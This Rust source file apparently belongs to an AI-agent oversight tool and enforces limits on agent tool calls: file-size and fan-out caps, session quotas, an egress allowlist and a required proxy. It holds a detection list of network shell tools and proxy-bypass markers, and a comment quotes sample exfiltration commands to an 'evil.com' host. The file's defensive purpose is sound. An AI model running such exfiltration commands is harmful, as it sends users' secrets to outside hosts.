use crate::*;

// Resource-governance defaults now live in one place — the policy document's
// `ResourceGovernance` `impl Default` (gensee-crate-rules) — and are resolved
// here with env-var override (see `ResourceGovernanceConfig::resolve`).

#[derive(Debug, Clone)]
pub(crate) struct ResourceGovernanceConfig {
    pub(crate) max_read_bytes: u64,
    pub(crate) max_file_subjects_per_tool: usize,
    pub(crate) max_shell_segments_per_tool: usize,
    pub(crate) max_tool_calls_per_session: u64,
    pub(crate) max_network_egress_per_session: u64,
    pub(crate) max_file_accessed_rate_per_min: f64,
    pub(crate) max_network_rate_per_min: f64,
    pub(crate) require_egress_proxy: bool,
    pub(crate) egress_proxy_url: Option<String>,
    pub(crate) egress_allow_hosts: Vec<String>,
}

impl ResourceGovernanceConfig {
    /// Resolve from the active policy document, with env vars overriding the
    /// JSON layer (env > JSON > built-in default).
    pub(crate) fn resolve(doc: &policy::PolicyDocument) -> Self {
        let rg = &doc.resource_governance;
        let eg = &doc.egress;
        let egress_proxy_url = env::var("GENSEE_EGRESS_PROXY_URL")
            .ok()
            .or_else(|| eg.proxy_url.clone())
            .filter(|value| !value.trim().is_empty());
        let egress_allow_hosts = {
            let env_hosts = env_list("GENSEE_EGRESS_ALLOW_HOSTS");
            if env_hosts.is_empty() {
                normalize_hosts(eg.allow_hosts.iter().map(String::as_str))
            } else {
                env_hosts
            }
        };
        Self {
            max_read_bytes: env_u64_opt("GENSEE_MAX_READ_BYTES").unwrap_or(rg.max_read_bytes),
            max_file_subjects_per_tool: env_usize_opt("GENSEE_MAX_FILE_SUBJECTS_PER_TOOL")
                .unwrap_or(rg.max_file_subjects_per_tool),
            max_shell_segments_per_tool: env_usize_opt("GENSEE_MAX_SHELL_SEGMENTS_PER_TOOL")
                .unwrap_or(rg.max_shell_segments_per_tool),
            max_tool_calls_per_session: env_u64_opt("GENSEE_MAX_TOOL_CALLS_PER_SESSION")
                .unwrap_or(rg.max_tool_calls_per_session),
            max_network_egress_per_session: env_u64_opt("GENSEE_MAX_NETWORK_EGRESS_PER_SESSION")
                .unwrap_or(rg.max_network_egress_per_session),
            max_file_accessed_rate_per_min: env_f64_opt("GENSEE_MAX_FILE_ACCESSED_RATE_PER_MIN")
                .unwrap_or(rg.max_file_accessed_rate_per_min),
            max_network_rate_per_min: env_f64_opt("GENSEE_MAX_NETWORK_RATE_PER_MIN")
                .unwrap_or(rg.max_network_rate_per_min),
            require_egress_proxy: truthy_env_opt("GENSEE_REQUIRE_EGRESS_PROXY")
                .unwrap_or(eg.require_proxy)
                || egress_proxy_url.is_some(),
            egress_proxy_url,
            egress_allow_hosts,
        }
    }
}

pub(crate) fn resource_governance_findings_with_config(
    event: &AgentHookEvent,
    subjects: &[PolicySubject],
    store: Option<&EventStore>,
    config: &ResourceGovernanceConfig,
) -> Vec<PolicyFinding> {
    let mut findings = Vec::new();
    findings.extend(read_size_findings(subjects, config));
    findings.extend(fanout_findings(event, subjects, config));
    findings.extend(session_quota_findings(event, subjects, store, config));
    findings.extend(egress_policy_findings(event, config));
    findings
}

pub(crate) fn network_egress_marker_finding(event: &AgentHookEvent) -> Option<PolicyFinding> {
    event_has_network_egress(event).then(|| PolicyFinding {
        action: PolicyAction::Allow,
        severity: "info".to_string(),
        rule_id: "policy_network_egress".to_string(),
        message: "Network egress observed this session".to_string(),
        path: None,
        evidence: json!({ "source": "resource_governance" }),
    })
}

fn read_size_findings(
    subjects: &[PolicySubject],
    config: &ResourceGovernanceConfig,
) -> Vec<PolicyFinding> {
    let mut findings = Vec::new();
    let mut seen = HashSet::new();
    for subject in subjects {
        if subject.operation != "read" || !seen.insert(subject.path.clone()) {
            continue;
        }
        let Ok(metadata) = fs::metadata(&subject.path) else {
            continue;
        };
        let size = metadata.len();
        if size <= config.max_read_bytes {
            continue;
        }
        findings.push(PolicyFinding {
            action: PolicyAction::Ask,
            severity: "medium".to_string(),
            rule_id: "policy_read_size_limit".to_string(),
            message: format!(
                "Ask before reading large file: {} ({} bytes > {} byte limit)",
                subject.path, size, config.max_read_bytes
            ),
            path: Some(subject.path.clone()),
            evidence: json!({
                "source": "resource_governance",
                "size_bytes": size,
                "max_read_bytes": config.max_read_bytes,
            }),
        });
    }
    findings
}

fn fanout_findings(
    event: &AgentHookEvent,
    subjects: &[PolicySubject],
    config: &ResourceGovernanceConfig,
) -> Vec<PolicyFinding> {
    let mut findings = Vec::new();
    let file_subject_count = subjects.len();
    if file_subject_count > config.max_file_subjects_per_tool {
        findings.push(PolicyFinding {
            action: PolicyAction::Ask,
            severity: "high".to_string(),
            rule_id: "policy_file_fanout_limit".to_string(),
            message: format!(
                "Ask before tool call touching many file targets: {file_subject_count} > {}",
                config.max_file_subjects_per_tool
            ),
            path: None,
            evidence: json!({
                "source": "resource_governance",
                "file_subject_count": file_subject_count,
                "max_file_subjects_per_tool": config.max_file_subjects_per_tool,
            }),
        });
    }

    let Some(command) = event.tool_input_command.as_deref() else {
        return findings;
    };
    let segment_count = split_shell_segments(command).len();
    if segment_count > config.max_shell_segments_per_tool {
        findings.push(PolicyFinding {
            action: PolicyAction::Ask,
            severity: "high".to_string(),
            rule_id: "policy_shell_fanout_limit".to_string(),
            message: format!(
                "Ask before shell command with high process fan-out: {segment_count} segments > {}",
                config.max_shell_segments_per_tool
            ),
            path: None,
            evidence: json!({
                "source": "resource_governance",
                "shell_segment_count": segment_count,
                "max_shell_segments_per_tool": config.max_shell_segments_per_tool,
            }),
        });
    }
    findings
}

fn session_quota_findings(
    event: &AgentHookEvent,
    subjects: &[PolicySubject],
    store: Option<&EventStore>,
    config: &ResourceGovernanceConfig,
) -> Vec<PolicyFinding> {
    let mut findings = Vec::new();
    let (Some(store), Some(session_id)) = (store, event.session_id.as_deref()) else {
        return findings;
    };

    if let Ok(count) = store.session_agent_event_count(session_id, "PreToolUse") {
        if count > config.max_tool_calls_per_session {
            findings.push(PolicyFinding {
                action: PolicyAction::Block,
                severity: "high".to_string(),
                rule_id: "policy_tool_call_quota".to_string(),
                message: format!(
                    "Blocked tool call quota exhaustion for session {session_id}: {count} > {}",
                    config.max_tool_calls_per_session
                ),
                path: None,
                evidence: json!({
                    "source": "resource_governance",
                    "session_id": session_id,
                    "tool_call_count": count,
                    "max_tool_calls_per_session": config.max_tool_calls_per_session,
                }),
            });
        }
    }

    if event_has_network_egress(event) {
        if let Ok(prior_count) = store.session_alert_count(session_id, "policy_network_egress") {
            if prior_count >= config.max_network_egress_per_session {
                findings.push(PolicyFinding {
                    action: PolicyAction::Block,
                    severity: "high".to_string(),
                    rule_id: "policy_network_egress_quota".to_string(),
                    message: format!(
                        "Blocked network egress quota exhaustion for session {session_id}: prior egresses {prior_count} >= {}",
                        config.max_network_egress_per_session
                    ),
                    path: None,
                    evidence: json!({
                        "source": "resource_governance",
                        "session_id": session_id,
                        "prior_network_egress_count": prior_count,
                        "max_network_egress_per_session": config.max_network_egress_per_session,
                    }),
                });
            }
        }
    }

    if let Ok(Some((request_id, file_rate, network_rate))) =
        store.latest_request_resource_rates(session_id)
    {
        if !subjects.is_empty() && file_rate > config.max_file_accessed_rate_per_min {
            findings.push(PolicyFinding {
                action: PolicyAction::Ask,
                severity: "high".to_string(),
                rule_id: "policy_request_file_rate_limit".to_string(),
                message: format!(
                    "Ask before continuing request with high file access rate: {:.2}/min > {:.2}/min",
                    file_rate, config.max_file_accessed_rate_per_min
                ),
                path: None,
                evidence: json!({
                    "source": "resource_governance",
                    "request_id": request_id,
                    "file_accessed_rate": file_rate,
                    "max_file_accessed_rate_per_min": config.max_file_accessed_rate_per_min,
                }),
            });
        }
        if event_has_network_egress(event) && network_rate > config.max_network_rate_per_min {
            findings.push(PolicyFinding {
                action: PolicyAction::Block,
                severity: "high".to_string(),
                rule_id: "policy_request_network_rate_limit".to_string(),
                message: format!(
                    "Blocked request with high network egress rate: {:.2}/min > {:.2}/min",
                    network_rate, config.max_network_rate_per_min
                ),
                path: None,
                evidence: json!({
                    "source": "resource_governance",
                    "request_id": request_id,
                    "network_rate": network_rate,
                    "max_network_rate_per_min": config.max_network_rate_per_min,
                }),
            });
        }
    }

    findings
}

fn egress_policy_findings(
    event: &AgentHookEvent,
    config: &ResourceGovernanceConfig,
) -> Vec<PolicyFinding> {
    if !event_has_network_egress(event) {
        return Vec::new();
    }
    let mut findings = Vec::new();

    if !config.egress_allow_hosts.is_empty() {
        let blocked_hosts = network_hosts_for_event(event)
            .into_iter()
            .filter(|host| !host_allowed(host, &config.egress_allow_hosts))
            .collect::<Vec<_>>();
        if !blocked_hosts.is_empty() {
            findings.push(PolicyFinding {
                action: PolicyAction::Block,
                severity: "high".to_string(),
                rule_id: "policy_egress_host_not_allowed".to_string(),
                message: format!(
                    "Blocked network egress to host outside allowlist: {}",
                    blocked_hosts.join(", ")
                ),
                path: None,
                evidence: json!({
                    "source": "resource_governance",
                    "blocked_hosts": blocked_hosts,
                    "allow_hosts": config.egress_allow_hosts.clone(),
                }),
            });
        }
    }

    if config.require_egress_proxy {
        if let Some(command) = event.tool_input_command.as_deref() {
            if command_bypasses_or_cannot_use_proxy(command) {
                findings.push(PolicyFinding {
                    action: PolicyAction::Block,
                    severity: "high".to_string(),
                    rule_id: "policy_egress_proxy_required".to_string(),
                    message: "Blocked direct network egress while egress proxy mode is required"
                        .to_string(),
                    path: None,
                    evidence: json!({
                        "source": "resource_governance",
                        "proxy_url": config.egress_proxy_url.clone(),
                        "reason": "direct_socket_or_proxy_bypass",
                    }),
                });
            }
        } else if native_network_url_count(event) > 0 && config.egress_proxy_url.is_none() {
            findings.push(PolicyFinding {
                action: PolicyAction::Ask,
                severity: "medium".to_string(),
                rule_id: "policy_egress_proxy_required".to_string(),
                message: "Ask before native network egress with no configured egress proxy URL"
                    .to_string(),
                path: None,
                evidence: json!({
                    "source": "resource_governance",
                    "reason": "native_network_tool_no_proxy_url",
                }),
            });
        }
    }

    findings
}

pub(crate) fn command_bypasses_or_cannot_use_proxy(command: &str) -> bool {
    let lower = command.to_ascii_lowercase();
    if lower.contains("/dev/tcp/")
        || lower.contains("/dev/udp/")
        || lower.contains("--noproxy")
        || lower.contains("no_proxy=")
        || lower.contains("no_proxy =")
    {
        return true;
    }

    split_shell_segments(command).iter().any(|segment| {
        let tokens = shell_words(segment);
        let command_tokens = strip_leading_env_assignments(&tokens);
        let Some(program) = command_tokens.first().map(String::as_str) else {
            return false;
        };
        match command_basename(program) {
            "nc" | "ncat" | "netcat" | "socat" | "telnet" | "ssh" | "scp" | "sftp" | "ftp"
            | "tftp" => true,
            // git/rsync honor HTTP(S)_PROXY for http(s) transports but NOT for
            // ssh/git transports, so they only *bypass* a required proxy when
            // the target is SSH-style (user@host:path) or an ssh://, git://,
            // rsync:// scheme. An https git push, by contrast, can use the proxy.
            "git" | "rsync" => segment_uses_unproxyable_transport(segment, command_tokens),
            _ => false,
        }
    })
}

/// Whether a git/rsync segment targets a transport that ignores `HTTP(S)_PROXY`
/// (ssh-shorthand `user@host:path`, or an `ssh://` / `git://` / `rsync://`
/// scheme), and therefore bypasses a required egress proxy.
fn segment_uses_unproxyable_transport(segment: &str, command_tokens: &[String]) -> bool {
    let lower = segment.to_ascii_lowercase();
    if lower.contains("ssh://") || lower.contains("git://") || lower.contains("rsync://") {
        return true;
    }
    command_tokens
        .iter()
        .skip(1)
        .any(|token| ssh_target_host(token).is_some())
}

fn network_hosts_for_event(event: &AgentHookEvent) -> Vec<String> {
    let mut hosts = Vec::new();
    for text in url_candidate_texts(event) {
        hosts.extend(network_url_hosts(&text));
    }
    if let Some(command) = event.tool_input_command.as_deref() {
        hosts.extend(dev_socket_hosts(command));
        hosts.extend(ssh_shorthand_hosts(command));
    }
    dedupe_strings(hosts)
}

/// Hosts named via scp/rsync/git "SSH shorthand" (`[user@]host:path`) or a bare
/// `ssh user@host` target. These carry no `scheme://`, so [`network_url_hosts`]
/// misses them and the egress allowlist could never match the destination —
/// which is exactly how `git push git@evil.com:exfil.git` and
/// `scp secrets user@evil.com:/tmp` slip a URL-only allowlist.
///
/// Limited to the SSH-family programs to keep false positives low, and unable to
/// resolve a *named* remote (`git push origin`, host lives in `.git/config`); it
/// catches the destination where it appears literally on the command line
/// (`git clone <url>`, `git remote add <url>`, direct-URL push, scp/rsync/ssh).
fn ssh_shorthand_hosts(command: &str) -> Vec<String> {
    let mut hosts = Vec::new();
    for segment in split_shell_segments(command) {
        let tokens = shell_words(&segment);
        let command_tokens = strip_leading_env_assignments(&tokens);
        let Some(program) = command_tokens.first().map(|token| command_basename(token)) else {
            continue;
        };
        if !matches!(program, "scp" | "rsync" | "sftp" | "ssh" | "git") {
            continue;
        }
        for token in command_tokens.iter().skip(1) {
            if let Some(host) = ssh_target_host(token) {
                hosts.push(host);
            }
        }
    }
    dedupe_strings(hosts)
}

/// Extract the host from an SSH-style target: `[user@]host:path` (scp / rsync /
/// git over ssh) or a bare `user@host` (ssh). Returns `None` for flags, local
/// paths, `scheme://` URLs (handled by [`network_url_hosts`]), and ambiguous
/// `host:port`-only forms.
fn ssh_target_host(token: &str) -> Option<String> {
    if token.is_empty()
        || token.starts_with('-')
        || token.starts_with('/')
        || token.starts_with('.')
        || token.contains("://")
    {
        return None;
    }
    // [user@]host:path  (scp / rsync / git over ssh)
    if let Some((left, right)) = token.split_once(':') {
        if right.is_empty() || left.contains('/') || right.chars().all(|c| c.is_ascii_digit()) {
            return None;
        }
        return userinfo_host(left);
    }
    // bare user@host (e.g. `ssh user@host -- cmd`): require an explicit user so
    // we don't flag plain local tokens.
    if token.contains('@') {
        return userinfo_host(token);
    }
    None
}

/// Resolve the host from a `[user@]host` authority. Without an explicit `user@`
/// only a dotted FQDN is accepted, so non-host tokens like `make:target` are not
/// mistaken for destinations.
fn userinfo_host(authority: &str) -> Option<String> {
    let has_user = authority.contains('@');
    let host = authority.rsplit('@').next().unwrap_or(authority);
    if host.is_empty()
        || !host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.')
    {
        return None;
    }
    if !has_user && !host.contains('.') {
        return None;
    }
    Some(host.trim_end_matches('.').to_ascii_lowercase())
}

pub(crate) fn network_url_hosts(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut rest = lower.as_str();
    let mut hosts = Vec::new();
    while let Some(idx) = rest.find("://") {
        let scheme = rest[..idx]
            .rsplit(|c: char| !is_url_scheme_char(c))
            .next()
            .unwrap_or("");
        let after = &rest[idx + 3..];
        let end = url_authority_end(after);
        let authority = &after[..end];
        if is_network_url_scheme(scheme) {
            if let Some(host) = authority_host(authority) {
                hosts.push(host);
            }
        }
        rest = &after[end..];
    }
    dedupe_strings(hosts)
}

fn authority_host(authority: &str) -> Option<String> {
    let host_port = authority.rsplit('@').next().unwrap_or(authority);
    if host_port.is_empty() {
        return None;
    }
    if let Some(stripped) = host_port.strip_prefix('[') {
        return stripped
            .split_once(']')
            .map(|(host, _)| host.trim_end_matches('.').to_string())
            .filter(|host| !host.is_empty());
    }
    let host = host_port
        .split(':')
        .next()
        .unwrap_or(host_port)
        .trim_end_matches('.');
    (!host.is_empty()).then(|| host.to_string())
}

fn dev_socket_hosts(command: &str) -> Vec<String> {
    let mut hosts = Vec::new();
    for marker in ["/dev/tcp/", "/dev/udp/"] {
        let mut rest = command;
        while let Some(idx) = rest.find(marker) {
            let after = &rest[idx + marker.len()..];
            let host = after
                .split(['/', ' ', '\t', '\n', '\r', ';', '|', '&'])
                .next()
                .unwrap_or("")
                .trim_end_matches('.');
            if !host.is_empty() {
                hosts.push(host.to_ascii_lowercase());
            }
            rest = after;
        }
    }
    dedupe_strings(hosts)
}

fn native_network_url_count(event: &AgentHookEvent) -> usize {
    let Ok(value) = serde_json::from_str::<Value>(&event.raw_json) else {
        return 0;
    };
    let Some(input) = value.get("tool_input") else {
        return 0;
    };
    ["url", "uri", "endpoint"]
        .iter()
        .filter(|key| {
            input
                .get(**key)
                .and_then(Value::as_str)
                .is_some_and(text_has_network_url)
        })
        .count()
}

fn host_allowed(host: &str, allow_hosts: &[String]) -> bool {
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    allow_hosts.iter().any(|allowed| {
        let allowed = allowed.trim_end_matches('.').to_ascii_lowercase();
        host == allowed || host.ends_with(&format!(".{allowed}"))
    })
}

fn dedupe_strings(values: Vec<String>) -> Vec<String> {
    let mut out = Vec::new();
    let mut seen = HashSet::new();
    for value in values {
        if seen.insert(value.clone()) {
            out.push(value);
        }
    }
    out
}

// Env-override readers: return `Some` only when the env var is set to a valid
// (positive) value, so resolution can fall back to the JSON policy layer.
fn env_u64_opt(name: &str) -> Option<u64> {
    env::var(name)
        .ok()
        .and_then(|value| value.parse::<u64>().ok())
        .filter(|value| *value > 0)
}

fn env_usize_opt(name: &str) -> Option<usize> {
    env::var(name)
        .ok()
        .and_then(|value| value.parse::<usize>().ok())
        .filter(|value| *value > 0)
}

fn env_f64_opt(name: &str) -> Option<f64> {
    env::var(name)
        .ok()
        .and_then(|value| value.parse::<f64>().ok())
        .filter(|value| *value > 0.0)
}

fn env_list(name: &str) -> Vec<String> {
    env::var(name)
        .ok()
        .map(|value| normalize_hosts(value.split([':', ','])))
        .unwrap_or_default()
}

/// Normalize a host list (trim, drop empties + trailing dot, lowercase) so JSON
/// and env values match the same way.
fn normalize_hosts<'a>(items: impl Iterator<Item = &'a str>) -> Vec<String> {
    items
        .map(str::trim)
        .filter(|item| !item.is_empty())
        .map(|item| item.trim_end_matches('.').to_ascii_lowercase())
        .collect()
}

fn truthy_env_opt(name: &str) -> Option<bool> {
    match env::var(name).ok().as_deref() {
        Some("1") | Some("true") | Some("yes") => Some(true),
        Some("0") | Some("false") | Some("no") => Some(false),
        _ => None,
    }
}
